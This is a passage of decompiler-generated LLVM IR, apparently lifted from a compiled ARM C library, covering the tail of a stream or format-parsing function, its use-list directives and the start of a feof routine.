  %v4_252b8 = load i16, i16* %v3_252b8, align 2
  %v6_252b8 = sext i16 %v4_252b8 to i32
  %v1_252bc = load i32, i32* @ip, align 4
  %v2_252bc = or i32 %v1_252bc, %v6_252ac
  %v2_252c0 = and i32 %v2_252bc, %v6_252b8
  store i32 %v2_252c0, i32* %r1.global-to-local, align 4
  store i32 -39324, i32* %r3.global-to-local, align 4
  %v2_252c8 = add i32 %v0_25280, -39324
  store i32 %v2_252c8, i32* %r0.global-to-local, align 4
  store i32 %v2_252c0, i32* %stack_var_-72, align 4
  %v0_252ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_252e0

dec_label_pc_252d4:                               ; preds = %dec_label_pc_25250
  %v1_252d4 = add i32 %v1_25264, 1
  %v2_252d4 = inttoptr i32 %v1_252d4 to i8*
  %v3_252d4 = load i8, i8* %v2_252d4, align 1
  %v4_252d4 = zext i8 %v3_252d4 to i32
  store i32 %v4_252d4, i32* %r3.global-to-local, align 4
  store i32 %v1_252d4, i32* %r0.global-to-local, align 4
  %v2_252d8 = icmp eq i8 %v3_252d4, 0
  br i1 %v2_252d8, label %dec_label_pc_252e0, label %dec_label_pc_25250

dec_label_pc_252e0:                               ; preds = %dec_label_pc_252d4, %dec_label_pc_25294
  %v0_252ec = phi i32 [ %v0_252ec.pre, %dec_label_pc_25294 ], [ %v0_25234, %dec_label_pc_252d4 ]
  %v0_252e8 = phi i32 [ %v1_252bc, %dec_label_pc_25294 ], [ %v3_25240, %dec_label_pc_252d4 ]
  %v0_252e0 = load i32, i32* @r4, align 4
  %v1_252e0 = and i32 %v0_252e0, 4
  %v1_252e4 = and i32 %v0_252e0, -5
  store i32 %v1_252e4, i32* %r3.global-to-local, align 4
  %v1_252e8 = and i32 %v0_252e8, 3840
  store i32 %v1_252e8, i32* %r2.global-to-local, align 4
  %v1_252ec = inttoptr i32 %v0_252ec to i8*
  %v2_252ec = load i8, i8* %v1_252ec, align 1
  %v3_252ec = zext i8 %v2_252ec to i32
  store i32 %v3_252ec, i32* %r1.global-to-local, align 4
  %v2_252f0 = or i32 %v1_252e4, %v1_252e8
  store i32 %v2_252f0, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_252e0, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_252fc = load i32, i32* %r7.global-to-local, align 4
  %v2_252fc = add i32 %v1_252fc, 20
  %v3_252fc = inttoptr i32 %v2_252fc to i32*
  store i32 %tmp181, i32* %v3_252fc, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_25304 = load i32, i32* %r1.global-to-local, align 4
  %v1_25304 = load i32, i32* %r7.global-to-local, align 4
  %v2_25304 = add i32 %v1_25304, 12
  %v3_25304 = inttoptr i32 %v2_25304 to i32*
  store i32 %v0_25304, i32* %v3_25304, align 4
  %v0_25308 = load i32, i32* %r7.global-to-local, align 4
  %v1_25308 = add i32 %v0_25308, 4
  %v2_25308 = inttoptr i32 %v1_25308 to i32*
  %v3_25308 = load i32, i32* @r5, align 4
  store i32 %v3_25308, i32* %v2_25308, align 4
  %v4_25308 = add i32 %v0_25308, 8
  %v5_25308 = inttoptr i32 %v4_25308 to i32*
  %v6_25308 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_25308, i32* %v5_25308, align 4
  %v0_2530c = load i32, i32* %r2.global-to-local, align 4
  %v1_2530c = load i32, i32* %r7.global-to-local, align 4
  %v2_2530c = add i32 %v1_2530c, 16
  %v3_2530c = inttoptr i32 %v2_2530c to i32*
  store i32 %v0_2530c, i32* %v3_2530c, align 4
  %v0_25310 = load i32, i32* %r3.global-to-local, align 4
  %v1_25310 = load i32, i32* %r7.global-to-local, align 4
  %v2_25310 = add i32 %v1_25310, 28
  %v3_25310 = inttoptr i32 %v2_25310 to i32*
  store i32 %v0_25310, i32* %v3_25310, align 4
  %v0_25314 = load i32, i32* %r0.global-to-local, align 4
  %v1_25314 = inttoptr i32 %v0_25314 to i8*
  %v2_25314 = load i8, i8* %v1_25314, align 1
  %v3_25314 = zext i8 %v2_25314 to i32
  store i32 %v3_25314, i32* %r2.global-to-local, align 4
  %v2_25318 = icmp eq i8 %v2_25314, 0
  br i1 %v2_25318, label %dec_label_pc_25320, label %dec_label_pc_253a4

dec_label_pc_25320:                               ; preds = %dec_label_pc_252e0
  %v0_25320 = load i32, i32* %r6.global-to-local, align 4
  %v1_25320 = inttoptr i32 %v0_25320 to i8*
  %v2_25320 = load i8, i8* %v1_25320, align 1
  %v3_25320 = zext i8 %v2_25320 to i32
  store i32 %v3_25320, i32* %r3.global-to-local, align 4
  %v7_25324 = icmp eq i8 %v2_25320, 109
  br i1 %v7_25324, label %.thread28, label %dec_label_pc_25338

.thread28:                                        ; preds = %dec_label_pc_25320
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_2532c = load i32, i32* %r7.global-to-local, align 4
  %v3_2532c = add i32 %v2_2532c, 32
  %v4_2532c = inttoptr i32 %v3_2532c to i32*
  store i32 20, i32* %v4_2532c, align 4
  %v1_25330 = load i32, i32* %r2.global-to-local, align 4
  %v2_25330 = load i32, i32* %r7.global-to-local, align 4
  %v3_25330 = add i32 %v2_25330, 28
  %v4_25330 = inttoptr i32 %v3_25330 to i32*
  store i32 %v1_25330, i32* %v4_25330, align 4
  br label %dec_label_pc_253a4

dec_label_pc_25338:                               ; preds = %dec_label_pc_25320
  store i32 20564, i32* %r3.global-to-local, align 4
  %v0_2533c = load i32, i32* @lr, align 4
  %v2_2533c = add i32 %v0_2533c, 20564
  %v3_2533c = inttoptr i32 %v2_2533c to i32*
  %v4_2533c = load i32, i32* %v3_2533c, align 4
  store i32 %v4_2533c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_25344 = load i32, i32* %r7.global-to-local, align 4
  %v2_25344 = add i32 %v1_25344, 32
  %v3_25344 = inttoptr i32 %v2_25344 to i32*
  store i32 21, i32* %v3_25344, align 4
  %v0_25348 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_25348, i32* @ip, align 4
  %v1_2534c = add i32 %v0_25348, 10
  store i32 %v1_2534c, i32* %r0.global-to-local, align 4
  %v0_25354.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_25354 = inttoptr i32 %v0_25354.pre to i8*
  br label %dec_label_pc_25350

dec_label_pc_25350:                               ; preds = %dec_label_pc_25394, %dec_label_pc_25338
  %v1_25360 = phi i32 [ %v1_25394, %dec_label_pc_25394 ], [ %v0_25348, %dec_label_pc_25338 ]
  %v1_25350 = inttoptr i32 %v1_25360 to i8*
  %v2_25350 = load i8, i8* %v1_25350, align 1
  %v3_25350 = zext i8 %v2_25350 to i32
  store i32 %v3_25350, i32* %r2.global-to-local, align 4
  %v2_25354 = load i8, i8* %v1_25354, align 1
  %v3_25354 = zext i8 %v2_25354 to i32
  store i32 %v3_25354, i32* %r3.global-to-local, align 4
  %v9_25358 = icmp eq i8 %v2_25350, %v2_25354
  br i1 %v9_25358, label %dec_label_pc_25360, label %dec_label_pc_25394

dec_label_pc_25360:                               ; preds = %dec_label_pc_25350
  %v2_25360 = sub i32 %v1_25360, %v0_25348
  store i32 %v2_25360, i32* %r3.global-to-local, align 4
  %v0_25368 = load i32, i32* %r7.global-to-local, align 4
  %v1_25368 = add i32 %v0_25368, 4
  store i32 %v1_25368, i32* %r0.global-to-local, align 4
  %v0_2536c = load i32, i32* @lr, align 4
  %v2_2536c = add i32 %v0_2536c, 60840
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_25374 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_25374, i32* %r2.global-to-local, align 4
  %v4_25378 = mul i32 %v2_25360, 4
  %v5_25378 = add i32 %v2_2536c, %v4_25378
  %v6_25378 = inttoptr i32 %v5_25378 to i32*
  %v7_25378 = load i32, i32* %v6_25378, align 4
  store i32 %v7_25378, i32* @ip, align 4
  store i32 152452, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_25378)
  %v0_25384 = load i32, i32* %r0.global-to-local, align 4
  %v1_25388 = load i32, i32* %r7.global-to-local, align 4
  %v2_25388 = add i32 %v1_25388, 28
  %v3_25388 = inttoptr i32 %v2_25388 to i32*
  store i32 %v0_25384, i32* %v3_25388, align 4
  %v7_2538c = icmp sgt i32 %v0_25384, 5
  br i1 %v7_2538c, label %dec_label_pc_254a0, label %dec_label_pc_253a4

dec_label_pc_25394:                               ; preds = %dec_label_pc_25350
  %v1_25394 = add i32 %v1_25360, 1
  store i32 %v1_25394, i32* %r1.global-to-local, align 4
  %v3_25398 = icmp ult i32 %v1_25394, %v1_2534c
  br i1 %v3_25398, label %dec_label_pc_25350, label %dec_label_pc_254a0

dec_label_pc_253a4:                               ; preds = %.thread28, %dec_label_pc_25360, %dec_label_pc_252e0
  %v0_253a4 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_253a4, 1
  br i1 %tmp156, label %dec_label_pc_25450, label %dec_label_pc_253ac

dec_label_pc_253ac:                               ; preds = %dec_label_pc_253a4
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_253c4 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_253b0

dec_label_pc_253b0:                               ; preds = %dec_label_pc_25438, %dec_label_pc_253ac
  %v9_253d0 = phi i32 [ 0, %dec_label_pc_253ac ], [ %v1_2543c, %dec_label_pc_25438 ]
  %v7_253b4 = icmp sgt i32 %v9_253d0, 2
  br i1 %v7_253b4, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_253b0
  store i32 %v9_253c4, i32* %r3.global-to-local, align 4
  %v10_253d0 = add i32 %v9_253d0, %v9_253c4
  store i32 %v10_253d0, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_253b0
  store i32 %v3_2502c.pre-phi, i32* @ip, align 4
  %v12_253b8 = mul i32 %v9_253d0, 4
  %v13_253b8 = add i32 %v12_253b8, %v3_2502c.pre-phi
  store i32 %v13_253b8, i32* %r3.global-to-local, align 4
  %v9_253c0 = add i32 %v13_253b8, -12
  %v10_253c0 = inttoptr i32 %v9_253c0 to i8*
  %v11_253c0 = load i8, i8* %v10_253c0, align 4
  %v12_253c0 = zext i8 %v11_253c0 to i32
  store i32 %v12_253c0, i32* %r2.global-to-local, align 4
  %v9_253c8 = load i32, i32* %r7.global-to-local, align 4
  %v10_253c8 = add i32 %v9_253c8, %v9_253d0
  store i32 %v10_253c8, i32* %r3.global-to-local, align 4
  store i32 %v12_253c0, i32* %r1.global-to-local, align 4
  %v11_253d4 = add i32 %v10_253c8, 36
  %v12_253d4 = inttoptr i32 %v11_253d4 to i8*
  store i8 %v11_253c0, i8* %v12_253d4, align 1
  %v0_253d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_253f8 = phi i32 [ %v10_253d0, %.thread38 ], [ %v0_253d8.pre, %bb157 ]
  %v1_253d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_253d8 = sub i32 %v0_253f8, %v1_253d8
  %v4_253d8 = xor i32 %v1_253d8, %v0_253f8
  %v5_253d8 = xor i32 %v2_253d8, %v0_253f8
  %v6_253d8 = and i32 %v5_253d8, %v4_253d8
  %v7_253d8 = icmp slt i32 %v6_253d8, 0
  %v8_253d8 = icmp slt i32 %v2_253d8, 0
  %v9_253d8 = icmp eq i32 %v0_253f8, %v1_253d8
  %v3_253dc = xor i1 %v8_253d8, %v7_253d8
  %v4_253dc = or i1 %v9_253d8, %v3_253dc
  br i1 %v4_253dc, label %dec_label_pc_253ec, label %dec_label_pc_253e0

dec_label_pc_253e0:                               ; preds = %bb158
  %v1_253e0 = add i32 %v0_253f8, -9
  %v3_253e0 = sub i32 8, %v0_253f8
  %v4_253e0 = and i32 %v3_253e0, %v0_253f8
  %v5_253e0 = icmp slt i32 %v4_253e0, 0
  %v6_253e0 = icmp slt i32 %v1_253e0, 0
  %v7_253e0 = icmp eq i32 %v0_253f8, 9
  %v3_253e4 = xor i1 %v6_253e0, %v5_253e0
  %v4_253e4 = or i1 %v7_253e0, %v3_253e4
  br i1 %v4_253e4, label %dec_label_pc_253e8, label %dec_label_pc_254a0

dec_label_pc_253e8:                               ; preds = %dec_label_pc_253e0
  store i32 %v0_253f8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_253ec

dec_label_pc_253ec:                               ; preds = %bb158, %dec_label_pc_253e8
  store i32 %v3_2502c.pre-phi, i32* @r2, align 4
  %v1_253f0 = load i32, i32* %r8.global-to-local, align 4
  %v4_253f0 = mul i32 %v1_253f0, 4
  %v5_253f0 = add i32 %v4_253f0, %v3_2502c.pre-phi
  store i32 %v5_253f0, i32* %sb.global-to-local, align 4
  %v1_253f4 = add i32 %v5_253f0, -40
  %v2_253f4 = inttoptr i32 %v1_253f4 to i32*
  %v3_253f4 = load i32, i32* %v2_253f4, align 4
  store i32 %v3_253f4, i32* %r5.global-to-local, align 4
  %v1_253f8 = add i32 %v0_253f8, -1
  store i32 %v1_253f8, i32* %r3.global-to-local, align 4
  %v0_253fc = load i32, i32* %r7.global-to-local, align 4
  %v4_253fc = mul i32 %v1_253f8, 4
  %v5_253fc = add i32 %v0_253fc, %v4_253fc
  store i32 %v5_253fc, i32* %sl.global-to-local, align 4
  %v7_25400 = icmp eq i32 %v3_253f4, 8
  %v1_25404 = add i32 %v5_253fc, 40
  %v2_25404 = inttoptr i32 %v1_25404 to i32*
  %v3_25404 = load i32, i32* %v2_25404, align 4
  store i32 %v3_25404, i32* @r0, align 4
  br i1 %v7_25400, label %dec_label_pc_25438, label %dec_label_pc_2540c

dec_label_pc_2540c:                               ; preds = %dec_label_pc_253ec
  %v9_2540c = icmp eq i32 %v3_25404, %v3_253f4
  br i1 %v9_2540c, label %dec_label_pc_25430, label %bb159

bb159:                                            ; preds = %dec_label_pc_2540c
  %v8_25410 = icmp eq i32 %v3_25404, 8
  br i1 %v8_25410, label %dec_label_pc_25430, label %dec_label_pc_25418

dec_label_pc_25418:                               ; preds = %bb159
  %v0_25418 = call i32 @_promoted_size()
  %v0_25420 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_25420, i32* @r0, align 4
  %v0_25424 = call i32 @_promoted_size()
  store i32 %v0_25424, i32* %r0.global-to-local, align 4
  %v8_2542c = icmp sgt i32 %v0_25418, %v0_25424
  br i1 %v8_2542c, label %dec_label_pc_25438, label %dec_label_pc_25418.dec_label_pc_25430_crit_edge

dec_label_pc_25418.dec_label_pc_25430_crit_edge:  ; preds = %dec_label_pc_25418
  %v0_25430.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_25434.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_25430

dec_label_pc_25430:                               ; preds = %dec_label_pc_25418.dec_label_pc_25430_crit_edge, %dec_label_pc_2540c, %bb159
  %v1_25434 = phi i32 [ %v1_25434.pre, %dec_label_pc_25418.dec_label_pc_25430_crit_edge ], [ %v5_253fc, %dec_label_pc_2540c ], [ %v5_253fc, %bb159 ]
  %v0_25430 = phi i32 [ %v0_25430.pre, %dec_label_pc_25418.dec_label_pc_25430_crit_edge ], [ %v5_253f0, %dec_label_pc_2540c ], [ %v5_253f0, %bb159 ]
  %v1_25430 = add i32 %v0_25430, -40
  %v2_25430 = inttoptr i32 %v1_25430 to i32*
  %v3_25430 = load i32, i32* %v2_25430, align 4
  store i32 %v3_25430, i32* %r3.global-to-local, align 4
  %v2_25434 = add i32 %v1_25434, 40
  %v3_25434 = inttoptr i32 %v2_25434 to i32*
  store i32 %v3_25430, i32* %v3_25434, align 4
  br label %dec_label_pc_25438

dec_label_pc_25438:                               ; preds = %dec_label_pc_25418, %dec_label_pc_253ec, %dec_label_pc_25430
  %v0_25438 = load i32, i32* %r7.global-to-local, align 4
  %v1_25438 = add i32 %v0_25438, 28
  %v2_25438 = inttoptr i32 %v1_25438 to i32*
  %v3_25438 = load i32, i32* %v2_25438, align 4
  %v0_2543c = load i32, i32* %r8.global-to-local, align 4
  %v1_2543c = add i32 %v0_2543c, 1
  store i32 %v1_2543c, i32* %r8.global-to-local, align 4
  %v1_25440 = add i32 %v3_25438, 2
  store i32 %v1_25440, i32* %r3.global-to-local, align 4
  %v6_25448 = icmp slt i32 %v1_2543c, %v1_25440
  br i1 %v6_25448, label %dec_label_pc_253b0, label %dec_label_pc_2546c

dec_label_pc_25450:                               ; preds = %dec_label_pc_253a4
  %v0_25450 = load i32, i32* %r7.global-to-local, align 4
  %v1_25450 = add i32 %v0_25450, 28
  %v2_25450 = inttoptr i32 %v1_25450 to i32*
  %v3_25450 = load i32, i32* %v2_25450, align 4
  store i32 %v3_25450, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_25458 = add i32 %v0_25450, 38
  %v4_25458 = inttoptr i32 %v3_25458 to i8*
  store i8 1, i8* %v4_25458, align 1
  %v0_2545c = load i32, i32* %r2.global-to-local, align 4
  %v3_2545c = mul i32 %v0_2545c, 4
  store i32 %v3_2545c, i32* @r2, align 4
  %v0_25460 = load i32, i32* %r7.global-to-local, align 4
  %v1_25460 = add i32 %v0_25460, 40
  store i32 %v1_25460, i32* @r0, align 4
  %v2_25464 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_25464, i32* @r1, align 4
  %v0_25468 = call i32 @memcpy()
  store i32 %v0_25468, i32* %r0.global-to-local, align 4
  %v0_2546c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_2546c

dec_label_pc_2546c:                               ; preds = %dec_label_pc_25438, %dec_label_pc_25450
  %v2_25488 = phi i32 [ %v0_2546c.pre, %dec_label_pc_25450 ], [ %v0_25438, %dec_label_pc_25438 ]
  %v1_2546c = add i32 %v2_25488, 16
  %v2_2546c = inttoptr i32 %v1_2546c to i32*
  %v3_2546c = load i32, i32* %v2_2546c, align 4
  store i32 %v3_2546c, i32* %r3.global-to-local, align 4
  %v1_25470 = and i32 %v3_2546c, 128
  %v2_25470 = icmp eq i32 %v1_25470, 0
  br i1 %v2_25470, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_2546c
  %v3_25474 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_25474, i32* %r3.global-to-local, align 4
  %v2_25478 = inttoptr i32 %v2_25488 to i32*
  %v3_25478 = load i32, i32* %v2_25478, align 4
  %v2_25480.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_25480 = sub i32 %v2_25480.pre, %v3_25474
  store i32 %v3_25480, i32* %r3.global-to-local, align 4
  %v5_25484 = mul i32 %v3_25480, 4
  %v6_25484 = add i32 %v5_25484, %v3_25478
  store i32 %v6_25484, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_2546c
  %v1_2547c45 = load i32, i32* %r6.global-to-local, align 4
  %v2_2547c46 = add i32 %v1_2547c45, 1
  store i32 %v2_2547c46, i32* %r3.global-to-local, align 4
  %v3_25488 = inttoptr i32 %v2_25488 to i32*
  store i32 %v2_2547c46, i32* %v3_25488, align 4
  %v0_2548c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_25494 = phi i32 [ %v2_25488, %.thread48 ], [ %v0_2548c.pre, %.thread50 ]
  %v1_2548c = add i32 %v1_25494, 28
  %v2_2548c = inttoptr i32 %v1_2548c to i32*
  %v3_2548c = load i32, i32* %v2_2548c, align 4
  store i32 %v3_2548c, i32* %r3.global-to-local, align 4
  %v1_25490 = add i32 %v3_2548c, 2
  store i32 %v1_25490, i32* %r0.global-to-local, align 4
  %v0_25494 = load i32, i32* %fp.global-to-local, align 4
  %v2_25494 = add i32 %v1_25494, 24
  %v3_25494 = inttoptr i32 %v2_25494 to i32*
  store i32 %v0_25494, i32* %v3_25494, align 4
  br i1 %v2_25470, label %dec_label_pc_254a4, label %bb161

bb161:                                            ; preds = %bb160
  %v1_25498 = load i32, i32* @r2, align 4
  %v2_25498 = load i32, i32* %r7.global-to-local, align 4
  %v3_25498 = inttoptr i32 %v2_25498 to i32*
  store i32 %v1_25498, i32* %v3_25498, align 4
  br label %dec_label_pc_254a4

dec_label_pc_254a0:                               ; preds = %dec_label_pc_25394, %dec_label_pc_24fb4, %dec_label_pc_250fc, %dec_label_pc_251a8, %dec_label_pc_25180, %dec_label_pc_2518c, %dec_label_pc_250c8, %dec_label_pc_253e0, %dec_label_pc_25360, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_254a4

dec_label_pc_254a4:                               ; preds = %bb161, %bb160, %dec_label_pc_254a0
  %v2_254a8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_254a8, i32* @r4, align 4
  store i32 %v6_24f70, i32* @r5, align 4
  store i32 %v27_24f70, i32* @lr, align 4
  %v1_254ac = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_254ac

; uselistorder directives
  uselistorder i32 %v3_25480, { 1, 0 }
  uselistorder i32 %v1_2543c, { 1, 2, 0 }
  uselistorder i32 %v2_253d8, { 1, 0 }
  uselistorder i32 %v1_253d8, { 1, 0, 2 }
  uselistorder i32 %v0_253f8, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_253d0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_25394, { 1, 2, 0 }
  uselistorder i32 %v0_25384, { 1, 0 }
  uselistorder i32 %v1_25360, { 1, 0, 2 }
  uselistorder i32 %v1_252d4, { 1, 2, 0 }
  uselistorder i32 %v1_252bc, { 1, 0 }
  uselistorder i32 %v2_252a4, { 2, 1, 0 }
  uselistorder i32 %v1_25288, { 0, 2, 3, 1 }
  uselistorder i32 %v0_25280, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_25264, { 1, 0, 2 }
  uselistorder i32 %v2_2524c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_25240, { 2, 1, 0 }
  uselistorder i32 %v1_25200, { 0, 2, 3, 1 }
  uselistorder i32 %v0_251f0.pre, { 0, 2, 1 }
  uselistorder i32 %v2_251cc, { 1, 0 }
  uselistorder i32 %v5_2512c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_2512c, { 1, 0 }
  uselistorder i32 %v0_2513076, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_250d4, { 1, 0 }
  uselistorder i32 %v0_250f4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_250b8, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_250a0, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_25090, { 1, 0 }
  uselistorder i32 %v3_25088, { 0, 2, 1 }
  uselistorder i8 %v2_25088, { 0, 1, 3, 2 }
  uselistorder i32 %v0_25108, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_2504c, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_25038, { 1, 2, 0, 3 }
  uselistorder i32 %v0_25020, { 1, 0 }
  uselistorder i32 %v3_2502c.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_24fd4, { 0, 2, 1 }
  uselistorder i32 %v2_24fc0, { 1, 0, 2 }
  uselistorder i32 %v0_24f74, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 3, 1, 2, 4, 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20 }
  uselistorder i32* %r6.global-to-local, { 13, 12, 11, 14, 10, 3, 4, 9, 5, 15, 6, 7, 8, 16, 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 52, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 40, 41, 42, 43, 44, 45, 46, 18, 47, 50, 51, 48, 49, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 24, 25, 23, 18, 26, 19, 20, 21, 27, 22, 28, 0, 29, 30, 31 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 21, { 0, 4, 3, 1, 2 }
  uselistorder i32 20564, { 1, 2, 0, 3 }
  uselistorder i32 3840, { 4, 5, 6, 0, 2, 1, 3 }
  uselistorder i32 -39324, { 0, 2, 1, 3 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_254a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_254a0, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_2546c, { 1, 0 }
  uselistorder label %dec_label_pc_25438, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25430, { 0, 2, 1 }
  uselistorder label %dec_label_pc_253ec, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_253a4, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_251b8, { 1, 0 }
  uselistorder label %dec_label_pc_2516c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_250e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_250e4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_25084, { 1, 0 }
  uselistorder label %dec_label_pc_25080, { 2, 0, 1 }
  uselistorder label %dec_label_pc_25084.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_25024, { 1, 0 }
  uselistorder label %dec_label_pc_24ff8, { 1, 0 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_254e0 = load i32, i32* @r4, align 4
  store i32 %v3_254e0, i32* %stack_var_-20, align 4
  %v2_254e4 = add i32 %tmp, 52
  %v3_254e4 = inttoptr i32 %v2_254e4 to i32*
  %v4_254e4 = load i32, i32* %v3_254e4, align 4
  store i32 128136, i32* %r5.global-to-local, align 4
  %v1_254ec = sub i32 1, %v4_254e4
  %v2_254ec = icmp ult i32 %v4_254e4, 2
  br i1 %v2_254ec, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_254ec, %entry ]
  %v0_254f4 = phi i32 [ 0, %bb ], [ %v1_254ec, %entry ]
  store i32 %storemerge, i32* %r7.global-to-local, align 4
  %v2_254f4 = icmp eq i32 %v0_254f4, 0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32* %r5.global-to-local, align 4
  br i1 %v2_254f4, label %dec_label_pc_25540, label %dec_label_pc_25508

dec_label_pc_25508:                               ; preds = %thread-pre-split
  %v2_2550c = add i32 %tmp, 56
  store i32 %v2_2550c, i32* %r4.global-to-local, align 4
  %v4_25520 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 164) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_25520)
  %v0_25534 = load i32, i32* %r5.global-to-local, align 4
  %v2_25534 = add i32 %v0_25534, 36
  %v3_25534 = inttoptr i32 %v2_25534 to i32*
  %v4_25534 = load i32, i32* %v3_25534, align 4
  store i32 %v4_25534, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_25534)
  %v0_25540.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_25544.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_25540.pre, 0
  br label %dec_label_pc_25540

dec_label_pc_25540:                               ; preds = %thread-pre-split, %dec_label_pc_25508
  %v0_25544 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_25544.pre, %dec_label_pc_25508 ]
  %v0_25540 = phi i1 [ true, %thread-pre-split ], [ %phitmp, %dec_label_pc_25508 ]
  %v1_25544 = inttoptr i32 %v0_25544 to i16*
  %v2_25544 = load i16, i16* %v1_25544, align 2
  %v3_25544 = zext i16 %v2_25544 to i32
  store i32 %v3_25544, i32* %r4.global-to-local, align 4
  br i1 %v0_25540, label %dec_label_pc_25540..thread4_crit_edge, label %bb15

